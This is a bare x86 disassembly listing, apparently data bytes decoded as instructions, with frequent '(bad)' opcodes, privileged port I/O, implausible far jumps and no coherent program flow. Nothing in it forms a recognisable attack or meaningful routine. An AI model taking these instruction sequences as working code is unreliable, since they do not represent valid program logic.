  404ff6:	add    dl,bl
  404ff8:	adc    ebp,eax
  404ffa:	sar    DWORD PTR [esi-0x56192d20],cl
  405000:	retf   0xceec
  405003:	xlat   BYTE PTR ds:[ebx]
  405004:	out    dx,eax
  405005:	in     eax,0xd9
  405007:	(bad)  
  405009:	fcomi  st,st(2)
  40500b:	fsqrt  
  40500d:	ret    0xf5ff
  405010:	(bad)  
  405012:	fcmovne st,st(0)
  405014:	(bad)  
  405015:	(bad)  
  405016:	out    0x2,eax
  405018:	adc    ebp,DWORD PTR [edi+ebp*8-0x36433f20]
  40501f:	vshufps ymm2,ymm1,ymm1,0xf1
  405024:	(bad)  
  405025:	fsubrp st(3),st
  405027:	lock ror ch,cl
  40502a:	mov    esp,0xc7e1e2de
  40502f:	shl    bh,cl
  405031:	ret    
  405032:	or     ebp,esi
  405034:	out    0xc9,eax
  405036:	in     eax,dx
  405037:	loopne 0x405008
  405039:	(bad)  
  40503a:	lock iret 
  40503c:	lods   eax,DWORD PTR ds:[esi]
  40503d:	scas   al,BYTE PTR es:[edi]
  40503e:	rcl    dl,cl
  405040:	out    0xb4,al
  405042:	mov    al,0xba
  405044:	(bad)  
  405046:	mov    ecx,0xdcecfdcf
  40504b:	fild   WORD PTR [esi]
  40504d:	push   edx
  40504f:	pop    es
  405050:	jmp    0x40504b
  405052:	retf   0xc60a
  405055:	aam    0xfb
  405057:	in     eax,0xc
  405059:	lods   eax,DWORD PTR ds:[esi]
  40505a:	mov    cl,0xcf
  40505c:	div    DWORD PTR [esi-0x1809564b]
  405062:	shr    dh,0xf9
  405065:	rcl    ebx,cl
  405067:	neg    eax
  405069:	add    eax,ecx
  40506b:	rol    eax,1
  40506d:	pop    es
  40506e:	fcmovb st,st(5)
  405070:	fcmovnu st,st(1)
  405072:	or     esi,ebx
  405074:	in     al,0xeb
  405076:	or     al,0xe9
  405078:	in     eax,0xc6
  40507a:	out    0xa5,eax
  40507c:	jecxz  0x405066
  40507e:	loope  0x40506b
  405080:	mov    ebx,0xe8e5f3b0
  405085:	repz jecxz 0x40506a
  405088:	fcom   st(5)
  40508a:	iret   
  40508b:	xlat   BYTE PTR ds:[ebx]
  40508c:	in     eax,dx
  40508d:	rcr    dl,1
  40508f:	add    edi,ecx
  405091:	aad    0xc8
  405093:	hlt    
  405094:	add    ebp,edx
  405096:	iret   
  405097:	sti    
  405098:	sar    DWORD PTR [ebp-0x363d2828],cl
  40509e:	into   
  40509f:	(bad)  
  4050a1:	mov    al,0xdf
  4050a3:	repnz imul ch
  4050a6:	not    esi
  4050a8:	mov    esp,0xc7ccbff5
  4050ad:	shl    ch,cl
  4050af:	loopne 0x40508a
  4050b1:	lock (bad) 
  4050b3:	fst    st(4)
  4050b5:	or     ebx,ebp
  4050b7:	fsub   st,st(7)
  4050b9:	loope  0x4050a7
  4050bb:	out    0xe4,eax
  4050bd:	call   0xd2144689
  4050c2:	ror    bl,1
  4050c4:	(bad)  
  4050c5:	in     al,0xbe
  4050c7:	fld    st(3)
  4050c9:	add    ebx,esp
  4050cb:	int3   
  4050cc:	aam    0xc3
  4050ce:	add    al,bl
  4050d0:	push   es
  4050d1:	mov    edi,0xf4eae805
  4050d6:	cld    
  4050d7:	loope  0x4050e1
  4050d9:	mov    esp,0xb1e1ece8
  4050de:	shr    DWORD PTR [ebp-0x4e1f3a10],cl
  4050e4:	int3   
  4050e5:	retf   
  4050e6:	stc    
  4050e7:	sar    BYTE PTR [ebp-0xb400d34],1
  4050ed:	ret    
  4050ee:	aam    0xc3
  4050f0:	(bad)  
  4050f1:	leave  
  4050f2:	loope  0x4050f6
  4050f4:	loope  0x4050d3
  4050f6:	or     DWORD PTR [ebx],ecx
  4050f8:	int3   
  4050f9:	out    0xaa,al
  4050fb:	rol    bh,0xdc
  4050fe:	retf   
  4050ff:	hlt    
  405100:	mov    dl,0xcd
  405102:	ror    ecx,1
  405104:	mov    edx,0xd0eadae9
  405109:	(bad)  
  40510a:	jecxz  0x40510f
  40510c:	not    ebp
  40510e:	cli    
  40510f:	(bad)  
  405111:	(bad)  
  405114:	or     eax,0xfd08020f
  405119:	int    0xb3
  40511b:	shl    cl,cl
  40511d:	out    0xd1,al
  40511f:	(bad)  
  405120:	aad    0xb7
  405122:	fcmovb st,st(6)
  405124:	(bad)  
  405125:	in     eax,dx
  405126:	mov    edx,0xceb9e8fe
  40512b:	add    al,dh
  40512d:	in     al,dx
  40512e:	(bad)  
  40512f:	in     eax,0xe3
  405131:	ror    BYTE PTR [eax],1
  405133:	or     cl,bl
  405135:	add    eax,0xd213fe08
  40513a:	sar    DWORD PTR [edi-0x18163344],0xc5
  405141:	sti    
  405142:	xlat   BYTE PTR ds:[ebx]
  405143:	fcomip st,st(2)
  405145:	shl    ch,cl
  405147:	retf   
  405148:	cld    
  405149:	add    ecx,esi
  40514b:	cld    
  40514c:	in     al,dx
  40514d:	shl    bh,cl
  40514f:	loope  0x405134
  405151:	mov    edi,0xc9e4c5c7
  405156:	fsubr  st,st(0)
  405158:	add    al,ah
  40515a:	iret   
  40515b:	(bad)
  40515e:	lock rcl edx,cl
  405161:	(bad)  
  405162:	(bad)  
  405164:	sar    DWORD PTR [edx-0x48153602],cl
  40516a:	icebp  
  40516b:	call   esp
  40516d:	sti    
  40516e:	mov    bl,0xfc
  405171:	pop    es
  405172:	rol    BYTE PTR [esi],1
  405174:	or     ah,al
  405176:	iret   
  405177:	loopne 0x405163
  405179:	in     eax,0xc3
  40517b:	mov    edi,0xd0d0e2ca
  405180:	cmc    
  405181:	mov    ecx,0xefead0ca
  405186:	int3   
  405187:	retf   0xbcf9
  40518a:	repnz fdivrp st(2),st
  40518d:	fcmovnbe st,st(6)
  40518f:	shl    cl,1
  405191:	hlt    
  405192:	retf   
  405193:	mov    ebp,0xdeff0600
  405198:	or     cl,ah
  40519a:	shl    DWORD PTR [edx-0x4b081434],0xb4
  4051a1:	mov    ah,0xf6
  4051a3:	in     al,dx
  4051a4:	out    dx,eax
  4051a5:	mov    ch,0xe9
  4051a7:	repz mov ecx,0xe3d7fecd
  4051ad:	fiadd  WORD PTR [edx]
  4051af:	pop    es
  4051b0:	stc    
  4051b1:	cmc    
  4051b2:	xlat   BYTE PTR ds:[ebx]
  4051b3:	or     ecx,edi
  4051b5:	out    0xce,al
  4051b7:	stc    
  4051b8:	rcl    ecx,cl
  4051ba:	jmp    0xe8e3:0xc7c8d5e3
  4051c1:	out    dx,eax
  4051c2:	aad    0xd7
  4051c4:	(bad)  
  4051c5:	enter  0xf6fb,0xda
  4051c9:	div    bh
  4051cb:	iret   
  4051cc:	push   edi
  4051ce:	out    0xfd,eax
  4051d0:	jecxz  0x4051a3
  4051d2:	std    
  4051d3:	retf   0xe1de
  4051d6:	loop   0x4051b6
  4051d8:	out    dx,al
  4051d9:	scas   al,BYTE PTR es:[edi]
  4051da:	fadd   st(6),st
  4051dc:	sar    DWORD PTR [ebp-0x38294c0a],cl
  4051e2:	jmp    0x1df:0xb5cfd7e9
  4051e9:	jmp    0xe11e19a6
  4051ee:	or     edi,ebp
  4051f0:	clc    
  4051f1:	in     eax,0xdb
  4051f3:	or     dl,ah
  4051f5:	in     al,dx
  4051f6:	loope  0x4051e5
  4051f8:	cld    
  4051f9:	rol    edi,cl
  4051fb:	repnz mov al,0xe7
  4051fe:	iret   
  4051ff:	shr    bh,0xc8
  405202:	hlt    
  405203:	xlat   BYTE PTR ds:[ebx]
  405204:	(bad)  
  405205:	cld    
  405206:	enter  0xf5f5,0x3
  40520a:	stc    
  40520b:	out    0xd2,al
  40520d:	std    
  40520e:	std    
  40520f:	(bad)  
  405211:	or     DWORD PTR ds:0xeafbcbc8,eax
  405217:	iret   
  405218:	fxch   st(0)
  40521a:	mov    al,0xb7
  40521c:	jmp    0x4051cf
  40521e:	lods   al,BYTE PTR ds:[esi]
  40521f:	hlt    
  405220:	rol    eax,cl
  405222:	xlat   BYTE PTR ds:[ebx]
  405223:	retf   0xfdfd
  405226:	cli    
  405227:	rcl    eax,cl
  405229:	add    ebx,edx
  40522b:	mov    esi,0x7dabff0
  405230:	add    al,0xf0
  405232:	retf   0xea02
  405235:	fucom  st(4)
  405237:	out    dx,eax
  405238:	or     eax,0xddb1afce
  40523d:	int    0xb2
  40523f:	out    dx,eax
  405240:	mov    al,0xcc
  405242:	in     eax,dx
  405243:	(bad)
  405246:	jmp    0xddd6:0xd8f1d3d4
  40524d:	add    eax,0xdfc0faf5
  405252:	test   cl,0xdd
  405255:	retf   0x113
  405258:	jmp    0x405225
  40525a:	rcl    al,cl
  40525c:	iret   
  40525d:	enter  0xf5ed,0xb1
  405261:	rol    ebp,0xd9
  405264:	jmp    0xcdbb:0x1fff2c5
  40526b:	mov    ch,0xd9
  40526d:	add    al,0xbc
  40526f:	fnclex 
  405271:	lds    eax,FWORD PTR [ebx]
  405273:	std    
  405274:	fild   DWORD PTR [esi]
  405276:	cld    
  405277:	loop   0x405256
  405279:	shl    cl,0xb3
  40527c:	aad    0xc0
  40527e:	retf   0xbbb0
  405281:	xlat   BYTE PTR ds:[ebx]
  405282:	mov    cl,0xff
  405284:	stc    
  405285:	(bad)  
  405286:	(bad)  
  405287:	call   0xc128248f
  40528c:	aam    0xc1
  40528e:	int3   
  40528f:	inc    DWORD PTR [esi]
  405291:	rol    esi,0xf4
  405294:	add    bh,al
  405296:	cli    
  405297:	loop   0x40527e
  405299:	iret   
  40529a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40529b:	mov    bl,0xe9
  40529d:	div    cl
  40529f:	ret    
  4052a0:	jmp    0xbcf1:0xfafeceb1
  4052a7:	jmp    0xccc6:0xc1d3d3fa
  4052ae:	hlt    
  4052af:	sti    
  4052b0:	(bad)  
  4052b2:	(bad)  
  4052b3:	clc    
  4052b4:	out    0xfc,al
  4052b6:	out    dx,al
  4052b7:	out    dx,al
  4052b8:	call   0xe72d3a9b
  4052bd:	mov    esp,0xdbbbe2e8
  4052c2:	repnz (bad) 
  4052c5:	icebp  
  4052c6:	icebp  
  4052c7:	fldln2 
  4052c9:	in     eax,dx
  4052ca:	mov    ecx,0xf0c3f3dd
  4052cf:	aad    0xf4
  4052d1:	leave  
  4052d2:	fmul   DWORD PTR [ecx]
  4052d4:	aam    0xe0
  4052d6:	loopne 0x4052dd
  4052d8:	fucom  st(7)
  4052da:	jecxz  0x4052a0
  4052dc:	int    0xd7
  4052de:	repz fcmovnb st,st(7)
  4052e1:	rcr    bh,1
  4052e3:	repz sti 
  4052e5:	out    dx,al
  4052e6:	jmp    0xf2291fa8
  4052eb:	fadd   st,st(3)
  4052ed:	add    ebx,ebp
  4052ef:	loop   0x4052f1
  4052f1:	retf   0xfadc
  4052f4:	fucom  st(1)
  4052f6:	(bad)  
  4052f7:	(bad)  
  4052f9:	call   0xd3ee18cf
  4052fe:	mov    al,0xcd
  405300:	jmp    0xf5f24dff
  405305:	mov    bl,0xf4
  405307:	aam    0xd9
  405309:	cmc    
  40530a:	shl    al,1
  40530c:	fdivrp st(7),st
  40530e:	faddp  st(0),st
  405310:	in     eax,0xfa
  405312:	xlat   BYTE PTR ds:[ebx]
  405313:	enter  0xcad5,0x1
  405317:	rol    DWORD PTR [edx],0xc7
  40531a:	repz repz in al,dx
  40531d:	shl    bh,cl
  40531f:	rcl    edx,1
  405321:	call   0xebf620f9
  405326:	leave  
  405327:	ret    
  405328:	in     al,dx
  405329:	add    edi,DWORD PTR [esi-0xf2001fe]
  40532f:	jecxz  0x405318
  405331:	lds    eax,FWORD PTR [eax]
  405333:	fucom  st(2)
  405335:	in     eax,dx
  405336:	enter  0xac8,0xe2
  40533a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40533b:	imul   DWORD PTR [edi-0x36394a2b]
  405341:	icebp  
  405342:	fldlg2 
  405344:	mov    ah,0xd2
  405346:	jmp    0xefff353b
  40534b:	iret   
  40534c:	aam    0xf7
  40534e:	in     eax,0xfc
  405350:	or     eax,DWORD PTR [ebx]
  405352:	add    eax,0xe5fec0d4
  405357:	cli    
  405358:	in     al,dx
  405359:	test   al,0xe3
  40535b:	iret   
  40535c:	fucomp st(6)
  40535e:	sti    
  40535f:	jmp    0xdab8:0xcfbbcefa
  405366:	stc    
  405367:	int    0xfc
  405369:	loop   0x40532b
  40536b:	fdivr  st(6),st
  40536d:	fdivr  st(1),st
  40536f:	rcl    bh,1
  405371:	add    eax,0xf40f02fb
  405376:	stc    
  405377:	or     eax,0xc3ecbf06
  40537c:	mov    esi,0xf2c1edec
  405381:	idiv   ebx
  405383:	lods   eax,DWORD PTR ds:[esi]
  405384:	cli    
  405385:	(bad)  
  405386:	mov    esi,0xcfedf9cb
  40538b:	xlat   BYTE PTR ds:[ebx]
  40538c:	ret    0xe3e3
  40538f:	rcl    dh,cl
  405391:	mov    edi,0xd9cae5fc
  405396:	push   cs
  405397:	shr    esi,cl
  405399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40539a:	retf   0xadd1
  40539d:	cmc    
  40539e:	loope  0x405349
  4053a0:	mov    ebx,0xfaece6ba
  4053a5:	enter  0xebc4,0xce
  4053a9:	in     al,dx
  4053aa:	out    dx,al
  4053ab:	xlat   BYTE PTR ds:[ebx]
  4053ac:	fdiv   st(2),st
  4053ae:	idiv   edi
  4053b0:	xlat   BYTE PTR ds:[ebx]
  4053b1:	loop   0x405399
  4053b3:	out    0xe4,eax
  4053b5:	in     eax,dx
  4053b6:	stc    
  4053b7:	jmp    0x4053a0
  4053b9:	mov    dl,0xac
  4053bb:	mov    cl,0xc0
  4053bd:	in     eax,dx
  4053be:	call   0xfa314e97
  4053c3:	sar    ebp,cl
  4053c5:	fdivr  st,st(2)
  4053c7:	mov    esi,0xd5ccf7ee
  4053cc:	(bad)  
  4053ce:	add    eax,0xd8c9d6d0
  4053d3:	jmp    0x4053cd
  4053d5:	in     eax,0xb
  4053d7:	fmulp  st(0),st
  4053d9:	shr    BYTE PTR [eax-0xd1e4938],1
  4053df:	mov    al,0xe4
  4053e1:	(bad)  
  4053e2:	out    0xf1,al
  4053e4:	fdivr  st,st(2)
  4053e6:	aad    0xdf
  4053e8:	cld    
  4053e9:	(bad)  
  4053ea:	mov    eax,0xd5d9ccbd
  4053ef:	rol    BYTE PTR [eax],1
  4053f1:	xlat   BYTE PTR ds:[ebx]
  4053f2:	add    dl,ch
  4053f4:	jmp    esp
  4053f6:	in     eax,0xed
  4053f8:	retf   
  4053f9:	mov    esp,0xe5bdb2ed
  4053fe:	jmp    0xfbc9:0xffcbb1f5
  405405:	out    dx,al
  405406:	in     al,dx
  405407:	jecxz  0x4053f6
  405409:	idiv   DWORD PTR [esi-0x2b3324f9]
  40540f:	ret    0xd1fa
  405412:	(bad)
  405415:	ret    
  405416:	out    0xe7,al
  405418:	std    
  405419:	lock loopne 0x4053cb
  40541c:	(bad)  
  40541e:	icebp  
  40541f:	mov    bh,0xcc
  405421:	clc    
  405422:	(bad)
  405425:	sti    
  405426:	shl    al,cl
  405428:	inc    DWORD PTR [ebx]
  40542a:	sar    esi,1
  40542c:	stc    
  40542d:	int3   
  40542e:	lock (bad) 
  405431:	(bad)  
  405433:	rcr    esi,0xdb
  405436:	out    dx,eax
  405437:	retf   0xc7df
  40543a:	rcl    al,0xe6
  40543d:	jecxz  0x405408
  40543f:	cmc    
  405440:	shl    DWORD PTR [ecx-0xe530f27],cl
  405446:	cli    
  405447:	add    esi,DWORD PTR [edi+ebp*8-0x41090d11]
  40544e:	fadd   DWORD PTR [ecx]
  405450:	push   es
  405451:	out    0x1,al
  405453:	psubb  mm0,QWORD PTR [edi]
  405456:	add    al,0xfb
  405458:	(bad)  
  40545a:	shr    BYTE PTR [esi-0x40a4e2f],1
  405460:	retf   0xeaea
  405463:	cmc    
  405464:	(bad)  
  405466:	mov    ebx,0xc1f7e3da
  40546b:	fld    DWORD PTR [edx]
  40546d:	fchs   
  40546f:	fsubr  st(7),st
  405471:	fsubr  st(2),st
  405473:	loope  0x405431
  405475:	(bad)  
  405477:	retf   0xf3df
  40547a:	rol    ecx,0xea
  40547d:	scas   al,BYTE PTR es:[edi]
  40547e:	lods   eax,DWORD PTR ds:[esi]
  40547f:	mov    dh,0xc8
  405481:	(bad)  
  405482:	jmp    0xe511305d
  405487:	loop   0x405482
  405489:	xlat   BYTE PTR ds:[ebx]
  40548a:	mov    ebp,0xe4fad5e3
  40548f:	fcmovnbe st,st(7)
  405491:	in     al,0xc2
  405493:	push   es
  405494:	aad    0xb
  405496:	pavgw  mm3,mm0
  405499:	mov    cl,0xd0
  40549b:	into   
  40549c:	test   al,0xcd
  40549e:	sti    
  40549f:	out    0xed,al
  4054a1:	loopne 0x405495
  4054a3:	(bad)  
  4054a4:	clc    
  4054a5:	retf   
  4054a6:	mov    ecx,0xddd5b8cb
  4054ab:	fcmovu st,st(3)
  4054ad:	int3   
  4054ae:	icebp  
  4054af:	stc    
  4054b0:	test   ebx,0xddf504dd
  4054b6:	(bad)  
  4054b8:	std    
  4054b9:	mov    esp,0xf3d3d1b2
  4054be:	int3   
  4054bf:	cmc    
  4054c0:	out    dx,eax
  4054c1:	mov    ch,0xbb
  4054c3:	clc    
  4054c4:	in     eax,0xb5
  4054c6:	imul   ah
  4054c8:	std    
  4054c9:	mov    ebx,0x4f2e2d8
  4054ce:	add    eax,0xe7f4e0c5
  4054d3:	stc    
  4054d4:	faddp  st(7),st
  4054d6:	fcmovne st,st(4)
  4054d8:	shl    eax,cl
  4054da:	(bad)  
  4054db:	out    0xe9,al
  4054dd:	(bad)
  4054e0:	div    DWORD PTR [esi-0x2333124e]
  4054e6:	retf   
  4054e7:	mov    ebx,0xd8cc02d3
  4054ec:	fst    st(1)
  4054ee:	cli    
  4054ef:	shr    dl,1
  4054f1:	fild   DWORD PTR [edx]
  4054f3:	fimul  WORD PTR ds:0xe8e8db02
  4054f9:	out    0xc0,eax
  4054fb:	(bad)  
  4054fc:	in     eax,0xe9
  4054fe:	(bad)
  405501:	loopne 0x405502
  405503:	iret   
  405504:	retf   
  405505:	std    
  405506:	sar    BYTE PTR [edi-0x41124210],cl
  40550c:	repz repz shl esp,1
  405510:	or     edx,ebp
  405512:	std    
  405513:	clc    
  405514:	shl    dh,0xe3
  405517:	or     esi,ebp
  405519:	mov    edi,0xe0cac1a8
  40551e:	ret    
  40551f:	retf   
  405520:	icebp  
  405521:	call   0xf1291d0b
  405526:	clc    
  405527:	ret    
  405528:	(bad)  
  405529:	fstp   TBYTE PTR [eax-0x422c311d]
  40552f:	add    ecx,ebp
  405531:	or     edi,edx
  405533:	jmp    0x405534
  405535:	jecxz  0x405546
  405537:	jecxz  0x405519
  405539:	lds    edi,FWORD PTR [eax-0x492d4d09]
  40553f:	loope  0x405529
  405541:	into   
  405542:	shl    BYTE PTR [esi-0x23020225],1
  405548:	std    
  405549:	loop   0x40551b
  40554b:	repz add dh,cl
  40554e:	out    0xe4,al
  405550:	loop   0x405553
  405552:	out    0xf4,al
  405554:	leave  
  405555:	jmp    0xada6:0xd0cbfdd4
  40555c:	xlat   BYTE PTR ds:[ebx]
  40555d:	mov    ch,0xaa
  40555f:	(bad)  
  405560:	into   
  405561:	shr    BYTE PTR [esi-0x442b0012],1
  405567:	jmp    0x40554b
  405569:	lock pop es
  40556b:	faddp  st(6),st
  40556d:	shl    ch,1
  40556f:	(bad)
  405572:	cld    
  405573:	retf   
  405574:	(bad)  
  405575:	out    dx,eax
  405576:	add    ebp,esp
  405578:	out    dx,al
  405579:	out    dx,eax
  40557a:	in     eax,dx
  40557b:	retf   0xe3e4
  40557e:	in     al,0xcb
  405580:	stc    
  405581:	in     al,dx
  405582:	(bad)
  405585:	(bad)  
  405586:	shr    edi,1
  405588:	add    ecx,edi
  40558a:	add    eax,DWORD PTR [ebx]
  40558c:	pop    es
  40558d:	ret    0xddf9
  405590:	repnz loop 0x405593
  405593:	in     al,0xd5
  405595:	retf   
  405596:	or     bh,bh
  405598:	rcr    bh,cl
  40559a:	loop   0x405585
  40559c:	mov    al,0xb1
  40559e:	aad    0xe9
  4055a0:	fcmove st,st(0)
  4055a2:	mov    cl,0xd5
  4055a4:	int    0xb7
  4055a6:	cmc    
  4055a7:	repz cmc 
  4055a9:	hlt    
  4055aa:	hlt    
  4055ab:	fstp   TBYTE PTR [eax-0x20ff0f0d]
  4055b1:	add    eax,0xcbe50906
  4055b6:	in     al,0xfd
  4055b8:	or     al,0xae
  4055ba:	shl    DWORD PTR [edi-0x3504111d],cl
  4055c0:	out    dx,eax
  4055c1:	out    dx,eax
  4055c2:	int    0xb9
  4055c4:	fcmovbe st,st(7)
  4055c6:	mov    edx,0xf7d7bfff
  4055cb:	out    0x3,eax
  4055cd:	add    al,dl
  4055cf:	retf   
  4055d0:	rol    DWORD PTR [eax],1
  4055d2:	add    eax,edi
  4055d4:	jmp    0x4055a3
  4055d6:	out    dx,eax
  4055d7:	add    ecx,DWORD PTR [ebx]
  4055d9:	iret   
  4055da:	fcomp  st(6)
  4055dc:	lock in eax,dx
  4055de:	mov    bh,0xb6
  4055e0:	jmp    0xb82904af
  4055e5:	mov    dh,0xcd
  4055e7:	enter  0xf1df,0xd2
  4055eb:	mov    ecx,0xd9d1f800
  4055f0:	cmc    
  4055f1:	hlt    
  4055f2:	(bad)  
  4055f5:	dec    BYTE PTR [ebx]
  4055f7:	in     eax,0xec
  4055f9:	stos   DWORD PTR es:[edi],eax
  4055fa:	rcr    ah,cl
  4055fc:	mov    dl,0xd2
  4055fe:	loopne 0x4055ea
  405600:	aad    0xc0
  405602:	icebp  
  405603:	mov    ecx,0xd1dcecec
  405608:	aam    0xd3
  40560a:	aam    0xd9
  40560c:	fcmove st,st(4)
  40560e:	mov    ebp,0xfec1dd06
  405613:	cmc    
  405614:	rol    BYTE PTR [ecx],0xe8
  405617:	jmp    0xdcd6:0xc1bcdfe9
  40561e:	int    0xef
  405620:	(bad)  
  405622:	idiv   BYTE PTR [eax-0x12244121]
  405628:	jmp    0xc1033516
  40562d:	out    0xd1,eax
  40562f:	sti    
  405630:	or     cl,BYTE PTR [eax]
  405632:	xlat   BYTE PTR ds:[ebx]
  405633:	mov    BYTE PTR [esi],0x8
  405636:	or     edi,esp
  405638:	jmp    0xc10b2103
  40563d:	(bad)  
  40563e:	mov    bl,0xb2
  405640:	retf   
  405641:	(bad)  
  405642:	enter  0xb7ad,0xb8
  405646:	shr    esi,1
  405648:	int    0xd5
  40564a:	out    dx,al
  40564b:	fmul   st,st(6)
  40564d:	shl    edi,0xfd
  405650:	fadd   st,st(0)
  405652:	or     dh,bh
  405654:	(bad)  
  405656:	loop   0x405620
  405658:	int    0xe4
  40565a:	lods   al,BYTE PTR ds:[esi]
  40565b:	leave  
  40565c:	into   
  40565d:	(bad)  
  40565e:	aam    0xf3
  405660:	mov    dh,0xe8
  405662:	aam    0xdf
  405664:	sti    
  405665:	(bad)  
  405666:	shl    edx,cl
  405668:	clc    
  405669:	cli    
  40566a:	pop    es
  40566b:	iret   
  40566c:	stc    
  40566d:	(bad)  
  40566e:	idiv   eax
  405670:	add    al,BYTE PTR [ebx]
  405672:	jmp    0xd312:0xecfbe0eb
  405679:	in     eax,0xc9
  40567b:	scas   al,BYTE PTR es:[edi]
  40567c:	loopne 0x405655
  40567e:	int    0xd3
  405680:	mov    dl,0xc7
  405682:	jmp    0x405678
  405684:	rcl    cl,1
  405686:	(bad)  
  405687:	enter  0xc2b0,0xba
  40568b:	out    dx,al
  40568c:	div    ah
  40568e:	ret    
  40568f:	out    0xc2,eax
  405691:	add    eax,0x8c9d9d5
  405696:	aam    0xe
  405698:	cld    
  405699:	out    0xe4,al
  40569b:	in     eax,0xf3
  40569d:	int3   
  40569e:	icebp  
  40569f:	jmp    0x405673
  4056a1:	mul    al
  4056a3:	clc    
  4056a4:	mov    edi,0xd0effada
  4056a9:	cld    
  4056aa:	aad    0xd5
  4056ac:	mov    eax,0xd206d7ed
  4056b1:	les    eax,FWORD PTR [ecx]
  4056b3:	out    0xcb,eax
  4056b5:	add    BYTE PTR [ecx],al
  4056b7:	clc    
  4056b8:	pop    es
  4056b9:	out    0xd2,al
  4056bb:	(bad)  
  4056bd:	mov    cl,0xe9
  4056bf:	(bad)
  4056c2:	mov    dh,0xd4
  4056c4:	test   dl,0xba
  4056c7:	add    ch,dl
  4056c9:	xlat   BYTE PTR ds:[ebx]
  4056ca:	pop    es
  4056cb:	(bad)  
  4056cd:	(bad)  
  4056ce:	lds    eax,FWORD PTR [ebx]
  4056d0:	pop    es
  4056d1:	or     esp,eax
  4056d3:	call   0xe90265ac
  4056d8:	retf   0xacca
  4056db:	out    0xb6,eax
  4056dd:	mov    ch,0xe7
  4056df:	sti    
  4056e0:	mov    ch,0xe8
  4056e2:	(bad)
  4056e6:	leave  
  4056e7:	jmp    0x4056c6
  4056e9:	fidivr DWORD PTR [edi-0x25393c0e]
  4056ef:	fcmovnu st,st(7)
  4056f1:	pop    es
  4056f2:	rol    BYTE PTR [ebx],0xdf
  4056f5:	pop    es
  4056f6:	int3   
  4056f7:	int    0xd9
  4056f9:	shl    edx,1
  4056fb:	lock lock in al,dx
  4056fe:	jmp    0xbfd4:0xe5d4f5b7
  405705:	rcl    edi,1
  405707:	fdivr  st,st(0)
  405709:	fnstsw WORD PTR [esi-0x26422524]
  40570f:	aad    0x5
  405711:	icebp  
  405712:	in     eax,0xe5
  405714:	paddd  mm0,QWORD PTR [eax]
  405717:	fmul   QWORD PTR [eax]
  405719:	fxch   st(5)
  40571b:	test   eax,0xeaf0c3de
  405720:	ror    cl,1
  405722:	into   
  405723:	into   
  405724:	mov    ebx,0xd6d8ecea
  405729:	mov    bh,0xf7
  40572b:	ret    0xe6fb
  40572e:	(bad)  
  40572f:	clc    
  405730:	(bad)  
  405732:	call   0x14d5137
  405737:	fldz   
  405739:	jmp    0xcfe2:0xb7e4cbef
  405740:	loope  0x405738
  405742:	jmp    0xcdc3:0xf5b4ecc6
  405749:	idiv   dh
  40574b:	loopne 0x405739
  40574d:	faddp  st(1),st
  40574f:	(bad)  
  405750:	jmp    0x40573d
  405752:	leave  
  405753:	out    dx,al
  405754:	out    0xef,eax
  405756:	add    ah,dh
  405758:	(bad)  
  405759:	repnz out 0xf7,al
  40575c:	imul   al
  40575e:	mov    ch,0xd1
  405760:	enter  0xebf1,0xf8
  405764:	clc    
  405765:	retf   0xcadf
  405768:	mov    ah,0xde
  40576a:	mov    ecx,0xe1f0d2bf
  40576f:	loope  0x405773
  405771:	add    bl,ah
  405773:	in     al,0xfa
  405775:	jmp    0xd00c1b8d
  40577a:	in     al,0xea
  40577c:	lods   al,BYTE PTR ds:[esi]
  40577d:	retf   
  40577e:	sti    
  40577f:	shl    ch,0xd3
  405782:	out    0xb7,al
  405784:	iret   
  405785:	std    
  405786:	(bad)  
  405787:	in     eax,dx
  405788:	sti    
  405789:	mov    bh,0xe2
  40578b:	loope  0x405764
  40578d:	out    0xdc,al
  40578f:	inc    BYTE PTR ds:0xfdeffeb
  405795:	ret    
  405796:	jecxz  0x40579c
  405798:	call   0xd4220464
  40579d:	in     al,0xac
  40579f:	aam    0xd3
  4057a1:	(bad)  
  4057a2:	hlt    
  4057a3:	into   
  4057a4:	in     al,dx
  4057a5:	repz mov edi,0xf5bbcfdb
  4057ab:	xlat   BYTE PTR ds:[ebx]
  4057ac:	aad    0xe0
  4057ae:	loopne 0x405772
  4057b0:	add    al,ah
  4057b2:	hlt    
  4057b3:	or     bl,bh
  4057b5:	fucomp st(7)
  4057b7:	inc    BYTE PTR [ebx]
  4057b9:	lods   eax,DWORD PTR ds:[esi]
  4057ba:	out    dx,eax
  4057bb:	test   eax,0xb4f4abd5
  4057c0:	int3   
  4057c1:	div    BYTE PTR [eax-0x2f48150e]
  4057c7:	stc    
  4057c8:	loop   0x4057cb
  4057ca:	neg    edi
  4057cc:	mov    ebp,0xf6e103e2
  4057d1:	icebp  
  4057d2:	(bad)  
  4057d4:	pop    es
  4057d5:	or     bl,dh
  4057d7:	add    DWORD PTR ds:0xe1bff2cb,ecx
  4057dd:	mov    al,0xe6
  4057df:	enter  0xf0f6,0xe8
  4057e3:	dec    bl
  4057e5:	hlt    
  4057e6:	imul   esp
  4057e8:	(bad)  
  4057ea:	(bad)  
  4057ec:	pop    es
  4057ed:	repnz (bad) 
  4057ef:	sar    ah,1
  4057f1:	push   es
  4057f2:	jmp    esp
  4057f4:	fxch   st(6)
  4057f6:	or     al,0xec
  4057f8:	fsub   st,st(4)
  4057fa:	loopne 0x4057e9
  4057fc:	repz jecxz 0x4057fa
  4057ff:	jmp    0x4057b3
  405801:	mov    bh,0xe8
  405803:	(bad)  
  405804:	lock mov edi,0xf5d2dfc8
  40580a:	into   
  40580b:	mov    esp,0xbc01bbd6
  405810:	out    0xe5,al
  405812:	enter  0xc6ee,0xd
  405816:	out    0xe9,eax
  405818:	add    edx,ebx
  40581a:	(bad)  
  40581c:	ret    0xefd0
  40581f:	ret    0xccd0
  405822:	loopne 0x405814
  405824:	fcomi  st,st(2)
  405826:	(bad)  
  405828:	mov    edx,0xfe02d8fa
  40582d:	jmp    edi
  40582f:	jmp    0xd9:0xdbfe03fd
  405836:	add    eax,edi
  405838:	leave  
  405839:	int    0xdf
  40583b:	retf   0xe1cd
  40583e:	rcl    dh,0xba
  405841:	mov    ah,0xb6
  405843:	sti    
  405844:	sti    
  405845:	in     eax,dx
  405846:	mov    eax,0xc8cfbdbd
  40584b:	add    ebx,esp
  40584d:	(bad)  
  40584e:	sti    
  40584f:	sti    
  405850:	neg    al
  405852:	retf   
  405853:	fld    QWORD PTR [edi]
  405855:	enter  0xe201,0x8
  405859:	in     al,0xad
  40585b:	vpmaxsw xmm1,xmm3,xmm1
